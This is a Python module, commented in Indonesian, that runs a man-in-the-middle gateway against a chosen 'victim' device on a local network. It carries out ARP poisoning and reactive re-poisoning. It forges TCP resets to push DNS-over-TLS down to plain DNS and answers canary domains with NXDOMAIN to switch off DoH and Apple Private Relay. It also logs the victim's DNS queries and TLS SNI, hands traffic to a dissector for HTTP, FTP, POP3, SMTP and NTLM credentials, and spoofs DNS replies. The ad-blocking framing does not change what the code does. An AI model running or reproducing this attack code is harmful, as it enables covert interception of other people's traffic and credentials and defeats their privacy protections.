#!/usr/bin/env python3
"""
Transparent MitM Gateway & Traffic Inspection Subsystem
========================================================
Mengorkestrasikan sesi Transparent Gateway (Pass-Through):
1. ARP Spoofing 100% (Pass-through mode tanpa packet drops)
2. Windows Kernel IP Forwarding Aktif
3. Reactive ARP & DoT Port 853 Reset
4. DNS Sniffer & Sinkhole Engine (Pi-hole style domain blocking & live DNS query logging)
5. Telemetri lalu lintas & Callback WebSocket broadcast
"""

import re
import threading
import time
from collections import deque
from typing import Dict, Any, List, Set, Optional, Callable
from scapy.all import Ether, IP, TCP, UDP, ARP, DNS, DNSQR, DNSRR, sendp, sniff

from ..spoofer import ARPSpoofer
from ..network import get_network_info, set_ip_forwarding, is_valid_private_ip
from ...utils.logger import logger
from ...exceptions.custom import SpoofError


CANARY_DOMAINS = {
    "use-application-dns.net",
    "mask.icloud.com",
    "mask-h2.icloud.com",
    "dns.google",
    "cloudflare-dns.com"
}

# Bettercap net.sniff SNI Regex pattern (net_sniff_sni.go)
BETTERCAP_SNI_RE = re.compile(b"\x00\x00.{4}\x00.{2}([a-z0-9]+([\\-\\.]{1}[a-z0-9]+)*\\.[a-z]{2,24})\x00", re.IGNORECASE)


def extract_tls_sni(payload: bytes) -> Optional[str]:
    """
    Ekstraksi Server Name Indication (SNI) dari paket TLS Client Hello Port 443.
    Menggabungkan parser biner RFC 6066 dengan Bettercap regex fallback.
    """
    if not payload or len(payload) < 9:
        return None

    # Verifikasi header TLS Record: 0x16 (Handshake) dan versi 0x03 (SSL 3.0 / TLS 1.0-1.3 wrapper)
    if payload[0] != 0x16 or payload[1] != 0x03:
        return None

    # Metoda 1: Parser biner struktural RFC 6066
    try:
        if payload[5] == 0x01:  # Client Hello
            pos = 43  # 5 (record) + 4 (handshake) + 2 (version) + 32 (random)
            if pos < len(payload):
                session_id_len = payload[pos]
                pos += 1 + session_id_len
                if pos + 2 <= len(payload):
                    cipher_len = int.from_bytes(payload[pos:pos+2], "big")
                    pos += 2 + cipher_len
                    if pos + 1 <= len(payload):
                        comp_len = payload[pos]
                        pos += 1 + comp_len
                        if pos + 2 <= len(payload):
                            ext_total_len = int.from_bytes(payload[pos:pos+2], "big")
                            pos += 2
                            end_pos = min(len(payload), pos + ext_total_len)
                            while pos + 4 <= end_pos:
                                ext_type = int.from_bytes(payload[pos:pos+2], "big")
                                ext_len = int.from_bytes(payload[pos+2:pos+4], "big")
                                pos += 4
                                if ext_type == 0x0000:  # Server Name extension (SNI)
                                    sub_pos = pos + 2
                                    if sub_pos + 3 <= pos + ext_len:
                                        name_type = payload[sub_pos]
                                        name_len = int.from_bytes(payload[sub_pos+1:sub_pos+3], "big")
                                        if name_type == 0 and sub_pos + 3 + name_len <= pos + ext_len:
                                            sni_str = payload[sub_pos+3:sub_pos+3+name_len].decode("utf-8", errors="ignore")
                                            if sni_str and "." in sni_str:
                                                return sni_str
                                pos += ext_len
    except Exception:
        pass

    # Metoda 2: Bettercap regex fallback parser (menangani TLS 1.3 / GREASE / fragmented headers)
    try:
        m = BETTERCAP_SNI_RE.search(payload)
        if m and len(m.groups()) > 0:
            extracted = m.group(1).decode("utf-8", errors="ignore").strip().lower()
            if extracted and "." in extracted and not extracted.endswith("."):
                return extracted
    except Exception:
        pass

    return None


class GatewayDNSSniffer:
    """Sniffer pasif & Active Relayer DNS UDP 53 + TLS SNI Port 443 + Dissector Protokol."""

    def __init__(
        self,
        target_ip: str,
        target_mac: str,
        gateway_ip: str,
        controller_ip: str,
        interface: Any,
        self_mac: str,
        sinkhole_domains: Set[str],
        gateway_mac: str = "",
        on_query_callback: Optional[Callable[[Dict[str, Any]], None]] = None,
        bettercap_dns: Any = None,
        bettercap_dissector: Any = None
    ):
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.controller_ip = controller_ip
        self.interface = interface
        self.self_mac = self_mac
        self.sinkhole_domains = sinkhole_domains
        self.on_query_callback = on_query_callback
        self.bettercap_dns = bettercap_dns
        self.bettercap_dissector = bettercap_dissector

        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._running = False
        self._seen_sni_cache: deque = deque(maxlen=300)
        self._last_reactive_target_ts = 0.0
        self._last_reactive_gateway_ts = 0.0

    def is_sinkholed(self, domain: str) -> bool:
        """Periksa apakah domain cocok dengan daftar blokir / sinkhole."""
        d = domain.lower().rstrip(".")
        for s in self.sinkhole_domains:
            s_clean = s.lower().strip().lstrip("*.")
            if d == s_clean or d.endswith("." + s_clean):
                return True
        return False

    def _process_packet(self, pkt):
        try:
            # 1. Unidirectional Reactive ARP Spoofing (Debounced 1.0 detik)
            if pkt.haslayer(ARP) and pkt[ARP].op == 1:
                arp = pkt[ARP]
                now_ts = time.time()
                # A. Target menanyakan MAC Gateway -> Balas segera agar target selalu merutekan ke Controller
                if self.gateway_ip and arp.pdst == self.gateway_ip and pkt[ARP].psrc == self.target_ip:
                    if now_ts - self._last_reactive_target_ts >= 1.0:
                        self._last_reactive_target_ts = now_ts
                        reply = (
                            Ether(dst=self.target_mac, src=self.self_mac) /
                            ARP(
                                op="is-at",
                                psrc=self.gateway_ip,
                                pdst=self.target_ip,
                                hwsrc=self.self_mac,
                                hwdst=self.target_mac
                            )
                        )
                        sendp(reply, iface=self.interface, verbose=False)
                        logger.debug(f"⚡ [Gateway Reactive ARP] Target {self.target_ip} re-poisoned for {self.gateway_ip}")
                    return

                # Catatan: Gateway menanyakan MAC Target TIDAK DIBALAS untuk mencegah MAC Flapping di Router!
                return

            # 2. DoT (DNS-over-TLS Port 853) Reset -> Paksa target fallback ke DNS UDP 53 standar
            if pkt.haslayer(TCP) and pkt[TCP].dport == 853 and pkt.haslayer(IP) and pkt[IP].src == self.target_ip:
                rst = (
                    Ether(dst=self.target_mac, src=self.self_mac) /
                    IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                    TCP(
                        sport=pkt[TCP].dport,
                        dport=pkt[TCP].sport,
                        seq=0,
                        ack=pkt[TCP].seq + 1,
                        flags="RA"
                    )
                )
                sendp(rst, iface=self.interface, verbose=False)
                logger.debug(f"🚫 [Gateway DoT Reset] Fallback port 853 -> UDP 53 from {self.target_ip}")
                return

            # 3. TLS SNI (Port 443 HTTPS Handshake Sniffer & Sinkhole Filter)
            if pkt.haslayer(TCP) and pkt[TCP].dport == 443 and pkt.haslayer(IP) and pkt[IP].src == self.target_ip:
                from scapy.all import Raw
                if pkt.haslayer(Raw):
                    sni = extract_tls_sni(pkt[Raw].load)
                    if sni:
                        sni_clean = sni.lower().strip().rstrip(".")
                        now_ts = time.time()
                        cache_key = f"{self.target_ip}_{sni_clean}"
                        if not any(k[0] == cache_key and now_ts - k[1] < 2.0 for k in self._seen_sni_cache):
                            self._seen_sni_cache.append((cache_key, now_ts))
                            blocked = self.is_sinkholed(sni_clean)
                            status = "sinkholed" if blocked else "allowed"

                            log_entry = {
                                "timestamp": now_ts,
                                "target_ip": self.target_ip,
                                "domain": sni_clean,
                                "qtype": "HTTPS (SNI)",
                                "status": status
                            }

                            if self.on_query_callback:
                                try:
                                    self.on_query_callback(log_entry)
                                except Exception as cb_err:
                                    logger.debug(f"Notice in SNI callback: {cb_err}")

                            if blocked:
                                # Injeksi TCP RST ke target untuk membatalkan koneksi HTTPS terblokir
                                rst = (
                                    Ether(dst=self.target_mac, src=self.self_mac) /
                                    IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                                    TCP(
                                        sport=pkt[TCP].dport,
                                        dport=pkt[TCP].sport,
                                        seq=pkt[TCP].ack or 0,
                                        ack=pkt[TCP].seq + len(pkt[Raw].load),
                                        flags="RA"
                                    )
                                )
                                sendp(rst, iface=self.interface, verbose=False)
                                logger.info(f"🚫 [Gateway SNI Sinkhole] Blocked HTTPS to '{sni_clean}' from {self.target_ip}")
                                return

            # 3.5 Bettercap Protocol Dissector (HTTP, FTP, POP3, SMTP, NTLM)
            if self.bettercap_dissector and pkt.haslayer(TCP) and pkt.haslayer(IP) and pkt[IP].src == self.target_ip:
                from scapy.all import Raw
                if pkt.haslayer(Raw):
                    try:
                        self.bettercap_dissector.dissect_raw_tcp(
                            client_ip=self.target_ip,
                            server_ip=pkt[IP].dst,
                            dport=pkt[TCP].dport,
                            raw_bytes=pkt[Raw].load
                        )
                    except Exception as diss_err:
                        logger.debug(f"Notice in dissector: {diss_err}")

            # 4. DNS UDP Port 53 Sniffer, Bettercap Dynamic Spoof & Sinkhole
            if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
                dns = pkt[DNS]
                if dns.qr == 0 and dns.opcode == 0:
                    # A0. Bettercap Dynamic DNS Spoofing Engine Rule Matching
                    if self.bettercap_dns:
                        handled = self.bettercap_dns.process_dns_query(
                            pkt=pkt,
                            client_ip=self.target_ip,
                            client_mac=self.target_mac,
                            self_mac=self.self_mac,
                            interface=self.interface,
                            default_redirect_ip=self.controller_ip
                        )
                        if handled:
                            return

                    qname = dns[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
                    qtype = dns[DNSQR].qtype
                    qtype_str = "A" if qtype == 1 else ("AAAA" if qtype == 28 else str(qtype))

                    # A. CANARY DOMAIN HANDLING (Memaksa Browser & Apple Private Relay Fallback ke DNS Lokal)
                    qname_lower = qname.lower().strip()
                    if any(qname_lower == c or qname_lower.endswith("." + c) for c in CANARY_DOMAINS):
                        src_mac = self.target_mac or (pkt[Ether].src if pkt.haslayer(Ether) else None)
                        src_ip = pkt[IP].src if pkt.haslayer(IP) else self.target_ip
                        dst_ip = pkt[IP].dst if pkt.haslayer(IP) else self.controller_ip
                        sport = pkt[UDP].sport if pkt.haslayer(UDP) else 53

                        canary_resp = (
                            Ether(dst=src_mac, src=self.self_mac) /
                            IP(src=dst_ip, dst=src_ip) /
                            UDP(sport=53, dport=sport) /
                            DNS(
                                id=dns.id,
                                qr=1,
                                aa=1,
                                rd=dns.rd,
                                ra=1,
                                rcode=3,  # NXDOMAIN
                                qd=dns.qd
                            )
                        )
                        sendp(canary_resp, iface=self.interface, verbose=False)
                        logger.info(f"🛡️ [Canary Domain Filter] Sent NXDOMAIN for '{qname}' -> Disabled DoH/Private Relay")
                        return

                    # B. Evaluasi apakah domain di-sinkhole
                    blocked = self.is_sinkholed(qname)
                    status = "sinkholed" if blocked else "allowed"

                    log_entry = {
                        "timestamp": time.time(),
                        "target_ip": self.target_ip,
                        "domain": qname,
                        "qtype": qtype_str,
                        "status": status
                    }

                    if self.on_query_callback:
                        try:
                            self.on_query_callback(log_entry)
                        except Exception as cb_err:
                            logger.debug(f"Notice in DNS query callback: {cb_err}")

                    if blocked:
                        an_record = DNSRR(rrname=dns[DNSQR].qname, type="A", rclass="IN", ttl=1, rdata="0.0.0.0") if qtype == 1 else None
                        src_mac = self.target_mac or (pkt[Ether].src if pkt.haslayer(Ether) else None)
                        src_ip = pkt[IP].src if pkt.haslayer(IP) else self.target_ip
                        dst_ip = pkt[IP].dst if pkt.haslayer(IP) else self.controller_ip
                        sport = pkt[UDP].sport if pkt.haslayer(UDP) else 53

                        resp = (
                            Ether(dst=src_mac, src=self.self_mac) /
                            IP(src=dst_ip, dst=src_ip) /
                            UDP(sport=53, dport=sport) /
                            DNS(
                                id=dns.id,
                                qr=1,
                                aa=1,
                                rd=dns.rd,
                                ra=1,
                                rcode=0,
                                qd=dns.qd,
                                an=an_record
                            )
                        )
                        sendp(resp, iface=self.interface, verbose=False)
                        logger.info(f"🚫 [Gateway Sinkhole] Blocked query '{qname}' from {self.target_ip} -> 0.0.0.0")
                        return

            # 5. PENERUSAN PAKET = TUGAS KERNEL (bukan user-space).
            # Kernel IP forwarding + Weak Host Model (set_ip_forwarding di start_gateway)
            # sudah meneruskan seluruh paket outbound target ke gateway asli. Forwarder
            # user-space di sini DIHAPUS karena akan MENERUSKAN GANDA paket yang sama
            # (kernel + Python) -> paket duplikat, dup-ACK/retransmisi TCP, dan bottleneck.
            # Mode redirect (manager.py) membuktikan kernel-forwarding-saja sudah benar.
            # Sniffer ini murni MENGAMATI (SNI / DNS / dissector) tanpa meneruskan.

        except Exception as e:
            logger.debug(f"Notice handling gateway packet: {e}")

    def _worker(self):
        logger.info(f"🎧 [Gateway Bridge] User-Space L2 Packet Forwarder & Sniffer aktif untuk {self.target_ip}...")
        # BPF Filter Presisi: Tangkap seluruh paket IP dari target IP (selain ke controller IP) & ARP target
        bpf_filter = (
            f"(ip and src host {self.target_ip} and not dst host {self.controller_ip}) or "
            f"(arp and host {self.target_ip})"
        )

        while not self._stop_event.is_set():
            try:
                sniff(
                    iface=self.interface,
                    filter=bpf_filter,
                    prn=self._process_packet,
                    store=0,
                    timeout=0.5
                )
            except Exception as e:
                if not self._stop_event.is_set():
                    logger.debug(f"Notice in Gateway bridge loop: {e}")
                    time.sleep(0.2)

        logger.info(f"🛑 [Gateway Bridge] Listener {self.target_ip} dihentikan.")

    def start(self):
        if self._running:
            return
        self._stop_event.clear()
        self._running = True
        self._thread = threading.Thread(target=self._worker, daemon=True, name=f"GatewayBridge-{self.target_ip}")
        self._thread.start()

    def stop(self):
        if not self._running:
            return
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2.0)
        self._running = False


class TransparentGatewayManager:
    """Manajer sesi Transparent Gateway (Pass-through MitM + Sniffer + Sinkhole)."""

    def __init__(
        self,
        spoofer: ARPSpoofer,
        on_dns_query_event: Optional[Callable[[Dict[str, Any]], None]] = None,
        bettercap_dns: Any = None,
        bettercap_dissector: Any = None
    ):
        self.spoofer = spoofer
        self.on_dns_query_event = on_dns_query_event
        self.bettercap_dns = bettercap_dns
        self.bettercap_dissector = bettercap_dissector
        self._sessions: Dict[str, Dict[str, Any]] = {}
        self._sinkhole_domains: Set[str] = {
            "doubleclick.net",
            "googleads.g.doubleclick.net",
            "adservice.google.com",
            "analytics.tiktok.com"
        }
        self._dns_logs: deque = deque(maxlen=200)
        self._lock = threading.Lock()

    def _get_controller_ip_and_mac(self):
        info = get_network_info()
        my_ip = info.get("ip")
        my_mac = self.spoofer._self_mac
        if not my_ip or not my_mac:
            raise SpoofError("Gagal mendeteksi IP/MAC lokal komputer pengawas")
        return my_ip, my_mac

    def _on_dns_query(self, log_entry: Dict[str, Any]):
        with self._lock:
            self._dns_logs.appendleft(log_entry)
        if self.on_dns_query_event:
            try:
                self.on_dns_query_event(log_entry)
            except Exception as e:
                logger.debug(f"Notice broadcasting gateway DNS query event: {e}")

    def start_gateway(
        self,
        victim_ip: str,
        victim_mac: str,
        gateway_ip: str,
        gateway_mac: str
    ) -> Dict[str, Any]:
        """Mulai mode Transparent Gateway untuk target IP tertentu."""
        # 1. Validasi Invariant: RFC 1918
        if not is_valid_private_ip(victim_ip):
            raise SpoofError(f"Target IP {victim_ip} di luar jangkauan RFC 1918")

        # 2. Validasi Invariant: Anti Self-Cut & Gateway Immunity
        info = get_network_info()
        my_ip = info.get("ip")
        if victim_ip == my_ip:
            raise SpoofError("Komputer pengawas (This PC) dilarang menjadi target Transparent Gateway")
        if victim_ip == gateway_ip:
            raise SpoofError("Router Gateway dilarang menjadi target Transparent Gateway")

        with self._lock:
            if victim_ip in self._sessions:
                self._stop_session_unlocked(victim_ip)

            my_ip, my_mac = self._get_controller_ip_and_mac()
            interface = self.spoofer._interface

            # A. Aktifkan ARP Spoofing mode pass-through (speed_limit=100)
            arp_session_id = self.spoofer.start(
                victim_ip=victim_ip,
                victim_mac=victim_mac,
                gateway_ip=gateway_ip,
                gateway_mac=gateway_mac,
                speed_limit=100,
                is_redirect=True
            )

            # B. Aktifkan Windows Kernel IP Forwarding
            set_ip_forwarding(True, self.spoofer._win_interface_name)

            # C. Jalankan Gateway DNS Sniffer & Sinkhole + Bettercap Dissectors
            sniffer = GatewayDNSSniffer(
                target_ip=victim_ip,
                target_mac=victim_mac,
                gateway_ip=gateway_ip,
                controller_ip=my_ip,
                interface=interface,
                self_mac=my_mac,
                sinkhole_domains=self._sinkhole_domains,
                gateway_mac=gateway_mac,
                on_query_callback=self._on_dns_query,
                bettercap_dns=self.bettercap_dns,
                bettercap_dissector=self.bettercap_dissector
            )
            sniffer.start()

            session_data = {
                "victim_ip": victim_ip,
                "victim_mac": victim_mac,
                "gateway_ip": gateway_ip,
                "gateway_mac": gateway_mac,
                "arp_session_id": arp_session_id,
                "sniffer": sniffer,
                "started_at": time.time()
            }
            self._sessions[victim_ip] = session_data

            logger.info(f"✨ [Transparent Gateway] Sesi aktif untuk {victim_ip} ({victim_mac}) via Gateway {gateway_ip}")

            return {
                "victim_ip": victim_ip,
                "victim_mac": victim_mac,
                "gateway_ip": gateway_ip,
                "arp_session_id": arp_session_id,
                "started_at": session_data["started_at"]
            }

    def _stop_session_unlocked(self, victim_ip: str):
        session = self._sessions.pop(victim_ip, None)
        if not session:
            return

        sniffer = session.get("sniffer")
        if sniffer:
            try:
                sniffer.stop()
            except Exception as e:
                logger.debug(f"Notice stopping gateway sniffer: {e}")

        arp_sid = session.get("arp_session_id")
        if arp_sid:
            try:
                self.spoofer.stop(arp_sid)
            except Exception as e:
                logger.debug(f"Notice stopping ARP session: {e}")

        logger.info(f"🏁 [Transparent Gateway] Sesi {victim_ip} dihentikan.")

    def stop_gateway(self, victim_ip: str) -> bool:
        with self._lock:
            if victim_ip not in self._sessions:
                logger.warning(f"Sesi Transparent Gateway {victim_ip} tidak ditemukan.")
                return False
            self._stop_session_unlocked(victim_ip)
            return True

    def stop_all(self):
        with self._lock:
            for ip in list(self._sessions.keys()):
                self._stop_session_unlocked(ip)

    def get_status(self) -> Dict[str, Any]:
        with self._lock:
            sessions_info = {}
            for ip, sess in self._sessions.items():
                sessions_info[ip] = {
                    "victim_ip": sess["victim_ip"],
                    "victim_mac": sess["victim_mac"],
                    "gateway_ip": sess["gateway_ip"],
                    "started_at": sess["started_at"]
                }
            return {
                "active_sessions": sessions_info,
                "active_count": len(sessions_info),
                "sinkhole_count": len(self._sinkhole_domains),
                "sinkhole_domains": sorted(list(self._sinkhole_domains)),
                "total_logs": len(self._dns_logs)
            }

    def add_sinkhole_domain(self, domain: str) -> bool:
        domain_clean = domain.strip().lower()
        if not domain_clean:
            return False
        with self._lock:
            self._sinkhole_domains.add(domain_clean)
            logger.info(f"➕ [Gateway Sinkhole] Ditambahkan: {domain_clean}")
            return True

    def remove_sinkhole_domain(self, domain: str) -> bool:
        domain_clean = domain.strip().lower()
        with self._lock:
            if domain_clean in self._sinkhole_domains:
                self._sinkhole_domains.remove(domain_clean)
                logger.info(f"➖ [Gateway Sinkhole] Dihapus: {domain_clean}")
                return True
            return False

    def get_sinkhole_domains(self) -> List[str]:
        with self._lock:
            return sorted(list(self._sinkhole_domains))

    def get_dns_logs(self, limit: int = 100) -> List[Dict[str, Any]]:
        with self._lock:
            logs = list(self._dns_logs)
            return logs[:limit]

    def clear_dns_logs(self):
        with self._lock:
            self._dns_logs.clear()
            logger.info("🧹 [Gateway Logs] Log DNS dibersihkan.")
